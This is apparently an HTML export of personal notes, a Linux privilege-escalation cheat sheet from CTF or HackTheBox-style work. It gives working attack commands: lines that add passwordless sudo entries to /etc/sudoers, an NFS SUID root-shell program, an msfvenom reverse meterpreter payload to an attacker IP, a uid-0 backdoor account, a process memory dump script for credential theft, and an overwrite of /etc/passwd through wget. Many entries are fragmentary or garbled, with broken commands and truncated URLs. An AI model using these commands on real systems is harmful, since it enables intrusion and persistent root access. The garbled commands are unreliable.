<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>29-tricks</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>29-tricks</h1><br/><p><h2>Bad permissions root</h2></p><p></p><p><div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">echo</span> <span style="color:#3ad900;font-weight:400">&quot;&lt;?php echo &#39;hello&#39;;passthru(&#39;echo \&#39;www-data ALL=(root) NOPASSWD: ALL\&#39; &gt;&gt;/etc/sudoers&#39;); ?&gt;&quot;</span> <span style="color:#ff9d00;font-weight:700">&gt;</span> root.php</pre></div></p><p><h2>linux file permissions :</h2><ul><li><h3>• </h3>• Find  world writables<ul><li> find / -o+w</li></ul></li></ul></p><p></p><p><ul><li>change to the tmp directory<ul><li> look for file that has been changed recently</li></ul></li></ul></p><p>	   ◇  find /tmp -1 </p><p>	   ◇  find /tmp </p><p>	   ◇  So, this command recursively finds all the files and directories from the</p><p> /home/sports directory modified at least 120 minutes ago.<ul><li> when this file is found search for scripts that call this file</li></ul></p><p>	   ◇  grep <ul><li> then see if it is possible to tamper with the file</li></ul></p><p>	   ◇  printf &#39;#! /bin/bashnecho &quot;michelle ALL=NOPASSWD:ALL&quot; &gt;&gt; /etc/sudoers&#39; &gt;</p><p>/usr/local/share/copy.sh</p><p></p><p><h2>linux_wildcard_gone_wild</h2><ul><li><h3>• </h3>• https://www.defensecode.com/public/DefenseCode<em>Unix</em>WildCards<em>Gone</em>Wild.txt</li><li>try to find the use of wildcard (in cron jobs for example)</li></ul></p><p></p><p></p><p></p><p></p><p></p><p><h2>shadow exploit</h2><h3></h3></p><p><h3></h3></p><p></p><p><h3>manually change password for /etc/shadow</h3><ul><li><h3>• </h3>• openssl passwd -salt xyz  pass<ul><li> -6 : sha512</li></ul></li></ul></p><p></p><p><h2>privilege escalation with /etc/passwd file :</h2><ul><li><h3>• </h3>• Historically, an empty second field in /etc/passwd means that</li></ul></p><p>the account has no password, i.e. anybody can log in without</p><p>a password (used for guest accounts). This is sometimes disabled</p><p></p><p><h2>using logs for PE</h2><ul><li><h3>• </h3>• found in /var/log or /var/...<ul><li> /var/mail for mailing logs</li></ul></li><li>commands :<ul><li> tail -n 5 /var/log/syslog</li><li> dmesg </li><li> https://stackify.com/linux</li></ul></li></ul></p><p><ul><li>before checking logs , check processes running that runs with root</li></ul></p><p></p><p><h3>classical exploit : PATH</h3><h3></h3></p><p><h3></h3></p><p><h2>other stuff</h2><ul><li><h3>• </h3>• /usr/sbin/nologin<ul><li> entries in passwd file</li><li> doesn&#39;t grant for this specific account the possibility for anyone to login to it</li></ul></li></ul></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p><h2>system function vulnerabilities related</h2><h3></h3></p><p><h3></h3><ul><li><em>relative path problem</em><ul><li> change the PATH AND create executable with a similar name</li><li> example #!/bin/bash -p</li></ul></li><li>if u can change the PATH ,k you can combine it with some cronjob</li></ul></p><p></p><p></p><p><h2>symlinks case : CVE2016</h2><ul><li>dpkg </li><li>if nginx version is below .6.2<ul><li> he exploit waits for Nginx server to be restarted or receive a USR1 signal.</li><li> https://www.exploit</li></ul></li></ul></p><p></p><p></p><p></p><p><h2>NFS root squashing</h2><ul><li><h3>• </h3>• Files created via NFS inherit the remote user&#39;s ID. If the user is root, and root squashing is enabled, the ID will instead be set to the &quot;nobody&quot; user.</li><li>the option that disables root squashing no<em>root</em>squash</li><li>1. Open command prompt and type: showmount </li><li>In command prompt type: mkdir /tmp/1</li><li>In command prompt type: mount In command prompt type:</li></ul></p><p>echo &#39;int main() { setgid(0); setuid(0); system(&quot;/bin/bash&quot;); return 0; }&#39; &gt; /tmp/1/x.c<ol><li>In command prompt type: gcc /tmp/1/x.c -o /tmp/1/x</li><li>In command prompt type: chmod +s /tmp/1/x</li></ol></p><p>https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/4/html/security_guide/s2-server-nfs-noroot</p><p></p><p></p><p></p><p><h2>bash special chjaracters</h2><ul><li><h3>• </h3>• https://mywiki.wooledge.org/BashGuide/SpecialCharacters#:~:text=Special%20characters,or%20%22meta%2Dcharacters%22.<ul><li>  is the process ID (PID) of the script itself.</li><li> $BASHPID is the process ID of the current instance of Bash.</li><li> if test $PASS /dev/null; then</li></ul></li></ul></p><p>    echo &quot;Well done you can validate the challenge with : $PASS&quot;</p><p></p><p></p><p></p><p><h2>Bash</h2><ul><li><h3>• </h3>• unquoted expression injection</li><li>if test $PASS /dev/null; then</li></ul></p><p></p><p></p><p><h2>motd.legal</h2><h3></h3></p><p><h3></h3>displayed exploit<ul><li>searchsploit motd</li><li>searchsploit <ul><li> works on old ubuntus</li><li> exploits pam 1.1.0</li></ul></li></ul></p><p>	   ◇  dpkg -i pam</p><p></p><p></p><p></p><p><h2>disks linux df</h2><ul><li><h3>• </h3>• df </li><li>strings /dev/sda</li></ul></p><p></p><p></p><p><h2>linux terminal number</h2><ul><li><h3>• </h3>• set <ul><li> suppose /dev/pts/8</li><li> chmod o+w /dev/pts/8; execute command &gt; /dev/pts/8S</li></ul></li></ul></p><p></p><p><h2>bash advanced: files</h2><ul><li><h3>• </h3>• man test</li></ul></p><p></p><p><h3>bash : unquoted expression statement</h3><ul><li><h3>• </h3>• https://stackoverflow.com/questions/65399335/unquotedinjection</li></ul></p><p></p><p><h3>python input(</h3><h3></h3></p><p><h3></h3> exploit<ul><li>The vulnerability in input() method lies in the fact that the variable accessing the value of input can be accessed by anyone just by using the name of variable or method. Let&#39;s explore these one by one:</li><li>always use raw<em>input(</em></li><li>exploit : sys.stdout.write(open(&quot;.passwd&quot;).readline())</li></ul></p><p></p><p></p><p></p><p></p><p></p><p><h2>snap sudo capability exploit : dirty_sock</h2><ul><li><h3>• </h3>• https://github.com/initstring/dirty<ul><li> requirements snapd </li></ul></li><li>python2 <em>-d &gt; leet.snap</em><ul><li> sudo /usr/bin/snap install devmode leet.snap</li><li> this will create a user dirty<em>sock: dirty</em>sock</li></ul></li></ul></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p><h2>bind privileged exploit without root</h2><ul><li><h3>• </h3>• authbind tool</li></ul></p><p></p><p></p><p><h2>wget 1.18</h2><a href="http://"></a></p><p><a href="http://"></a>* https://www.exploit-db.com/exploits/40064</p><p>* scenario wget is run within cron as root</p><p></p><p><h2>enumerate ACLS</h2><ul><li><h3>• </h3>• getfacl <a href="http://dir">directory</a></li></ul><a href="http://dir"></a></p><p><a href="http://dir"></a><h3></h3></p><p><h3></h3></p><p><h2>portforwarding</h2><ul><li><h3>• </h3>• if for example the shell doesn&#39;t have mysql client installed u can do portforwarding to access database</li><li>steps :</li></ul></p><p>	   ◇  go to meterpreter session :</p><p>			   ◇  msfvenom <em>-f elf -o shell LHOST=10.10.14.6 LPORT=5555</em></p><p>			   ◇  ./shell &amp;</p><p>			   ◇  metasploit : set payload linux/x64/meterpreter/reverse</p><p>	   ◇  portfwd add -p 3306  -r 127.0.0.1</p><p>	   ◇  We can now log in to MySQL in our normal session</p><p>			   ◇  mysql -u theseus -D Magic -</p><p></p><p></p><p><h2>spawn shell (instead python pty</h2><h3></h3></p><p><h3></h3><ul><li>/usr/bin/script </li></ul></p><p></p><p></p><p><h2>looking for a user in etc</h2><ul><li><h3>• </h3>• grep &#39;marcus&#39; /etc /dev/null</li></ul></p><p></p><p><h2>ssh tuneling</h2><ul><li><h3>• </h3>• when we find a port that is not open to the public (e.g 84443)</li></ul></p><p>	   ◇  127.0.0.1:8443</p><p>	   ◇  ssh -R 4444:127.0.0.1:4444 -R 8080:127.0.0.1:8080 marcus@monitors.htb</p><p>	   ◇  this command will portforward 8443 port from victim to attacker as well as work on 8080 and 4444 ports of the victim from the attacker machine  (usefull for later exploits )</p><p></p><p><h2>escape docker container</h2><ul><li><h3>• </h3>•  check docker container enumeration</li></ul></p><p>	.. ip a <h3>172.17.0.</h3><h3></h3></p><p><h3></h3></p><p>	.. open ports</p><p></p><p>	.. because a process in linux only shares info of processes with the same namespace</p><p>	.. method 2 : nc -zv 192.168.100.1 1-65535</p><p></p><p>. capsh --print</p><p><div class="codebox"><pre><br />#!/bin/bash<br />ports=(21 22 53 80 443 3306 8443 8080)<br />for port in ${ports[@]}; do<br />timeout 1 bash -c &quot;echo &quot;Port Scan Test&quot; &gt; /dev/tcp/1.1.1.1/$port &amp;&amp; echo $port is open || /dev/null&quot;<br />done<br /></pre></div>   ◇  get the capabilites<ul><li> e.g cap<em>sys</em>module</li></ul></p><p>		   ◇  https://blog.pentesteracademy.com/abusingmoduletodockerbreakout</p><p>		   ◇  The container has SYS</p><p>		<ul><li>ssh docker@172.17.0.1 </li></ul></p><p></p><p><h3>docker container security</h3><ul><li><h3>• </h3>• https://cheatsheetseries.owasp.org/cheatsheets/Docker<em>Security</em>Cheat</li></ul></p><p></p><p><h3>pspy</h3><h3></h3></p><p><h3></h3></p><p></p><p></p><p><h2>sudo exploits</h2><ul><li><h3>• </h3>• CVE18634</li></ul></p><p>	   ◇   https://github.com/saleemrashid/sudo2019</p><p>	   ◇   sudo version </p><p>	   ◇   buffer overflow<ul><li>CVE14287</li></ul></p><p></p><p></p><p><h2>binary symlinks : nginx exploit</h2><ul><li><h3>• </h3>• https://legalhackers.com/advisories/NginxDebPrivEsc2016</li><li>detection : exploitroot.sh</li><li>exploit replace log file with malicious file</li><li>we need a start / restart of nginx</li></ul></p><p></p><p></p><p></p><p><h2>kernel vulnerabilities</h2><ul><li><h3>• </h3>• first check the architecture and release notes for this machine<ul><li> cat /etc/</li><li> gcc version</li></ul></li></ul></p><p><ul><li> searchsploit Ubuntu <a href="http://version">version of ubuntu</a> <a href="http://kernel">kernel version</a> Local Privilege Escalation</li><li> grab an exploit from searcghsploit</li></ul></p><p>	   ◇  searchsploit <a href="http://number">number of exploit</a><a href="http://number"></a></p><p><a href="http://number"></a>	   ◇  dos2unix <a href="http://number">number of exploit</a><a href="http://number"></a></p><p><a href="http://number"></a></p><p></p><p><h2> docker suid</h2><ul><li>docker run <a href="http://image_id">image_id</a> whoami</li><li>docker run <a href="http://image_id">image_id</a> sh</li></ul></p><p></p><p></p><p><h3>persistence : adding user</h3><h3></h3></p><p><h3></h3>sudo useradd -ou 0 -g 0 youn</p><p>sudo passwd youn</p><p>echo &quot;password&quot; --stdin john</p><p></p><p></p><p></p><p></p><p><h2>dump memory process</h2><ul><li><h3>• </h3>• like in windows an attacker in linux can try to dump some process and look for credential</li><li>Script<a href="http://pid">pid</a></li></ul><a href="http://pid"></a></p><p><a href="http://pid"></a></p><p><div class="codebox"><pre><br /><br />#!/bin/bash<br />grep rw-p /proc/$1/maps <br />| sed -n &#39;s/^([0-9a-f]*)-([0-9a-f]*) .*$/1 2/p&#39; <br />| while read start stop; do <br />gdb --batch --pid $1 -ex <br />&quot;dump memory $1-$start-$stop.dump 0x$start 0x$stop&quot;; <br />done<br /><br /></pre></div></p><p></p><p></p><p></p><p></p><p><strong><h2>Enumerate firewall rules</h2></strong><ul><li>need admin</li><li>you can grep iptables files</li><li>grep -Hs iptables /etc/*</li></ul></p><p></p><p></p><p></p><p></p><p></p><p></p><p><strong><h2>Enumerate application versions</h2></strong></p><p><ul><li>in debian based<ul><li>dpkg -l</li></ul></li><li>in redhat based <ul><li>rpm -l</li></ul></li></ul></p><p></p><p></p><p><strong><h2>Enumerate readable/writable files dirs</h2></strong></p><p></p><p><ul><li>find / -writable -type d 2&gt;/dev/null</li></ul></p><p></p><p></p><p></p><p><strong><h2>Enumerate unmounted disks</h2></strong></p><p><ul><li>mount</li><li>cat /etc/fstab<ul><li>// physically attached</li></ul></li><li>lsblk<ul><li>all disks available</li></ul></li><li>// we can mount unmounted disks/partitions</li></ul></p><p></p><p></p><p><h1>SUID wget</h1><ul><li>openssl passwd -1 -salt root pass123</li><li>modify passwd</li><li>cd /etc</li><li>wget -O passwd $lhost/passwd</li></ul></p></div>
</body>
</html>
